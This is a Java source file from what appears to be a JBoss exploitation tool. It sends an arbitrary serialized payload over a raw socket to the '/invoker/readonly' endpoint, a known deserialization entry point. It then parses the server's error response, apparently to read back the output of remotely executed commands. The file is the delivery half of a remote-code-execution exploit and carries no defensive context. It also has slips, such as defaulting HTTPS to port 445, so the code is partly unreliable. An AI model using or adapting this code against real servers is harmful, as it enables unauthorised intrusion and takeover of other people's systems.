package com.jboss.main;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.ByteBuffer;

public class doPost {

	public static String DoPost(String url,byte[] Payload) throws Exception{
	    try {
//	        URL realUrl = new URL(url);
//	       
//	        HttpURLConnection conn = (HttpURLConnection) realUrl.openConnection();
	
//	        conn.setDoInput(true);
//	        conn.setDoOutput(true);
//	        conn.setRequestMethod("POST");
//	        conn.addRequestProperty("FileName", fileName);
//	        conn.setRequestProperty("accept", "*/*");
//	        conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
//	        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	    	if (!url.substring(0,4).equalsIgnoreCase("http")) {
	    		
	    		url="http://"+url;
	    	}
	    	URL urlobj=new URL(url);
	    String host=urlobj.getHost();
	    int port=urlobj.getPort();
		System.out.println(host+port);
	    if (port==-1) {
	    		try {
	    			String schema=urlobj.getProtocol();
	    			if (schema.equalsIgnoreCase("https")){
		    			port=445;
		    		}else{
		    			port=80;
		    		}
	    		}catch(Exception e) {
	    			port=80;
	    		}
	    		
	    }
	    
	    
        Socket socket = new Socket(host, port);
        socket.setSoTimeout(10000);
        StringBuffer sb = new StringBuffer();
        sb.append("POST /invoker/readonly HTTP/1.1\r\n");
        sb.append("Host: "+host+":"+port+"\r\n");
        sb.append("Content-Length: " + Payload.length + "\r\n");
        sb.append("accept: */*\r\n");
        sb.append("user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\r\n");
        sb.append("accept: */*\r\n");
    		sb.append("Content-Type: application/x-www-form-urlencoded\r\n");
        sb.append("\r\n");
        byte[] b3 = new byte[sb.toString().getBytes().length + Payload.length];
        System.arraycopy(sb.toString().getBytes(), 0, b3, 0, sb.toString().getBytes().length);
        System.arraycopy(Payload, 0, b3, sb.toString().getBytes().length, Payload.length);
        OutputStream data = socket.getOutputStream();
        //读取文件路径
        data.write(b3);
        data.flush();
        //写入数据
        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        
        StringBuffer s=new StringBuffer();
        String line="";
        while((line = br.readLine())!=null) {
        		s.append(line+"\r\n");
        }
        String res = s.toString();
        if(res.indexOf("java.lang.Exception")>=0) {
        		
        		return  res.split("java.lang.Exception:")[1].split("RunCheckConfig")[0];
        }
    } catch (Exception e) {
        System.out.println("异常," + e.getMessage());
        throw  e;
//	        e.printStackTrace();
    }
	return "";
	
}

	private static void StringBuffer() {
		// TODO Auto-generated method stub
		
	}
}
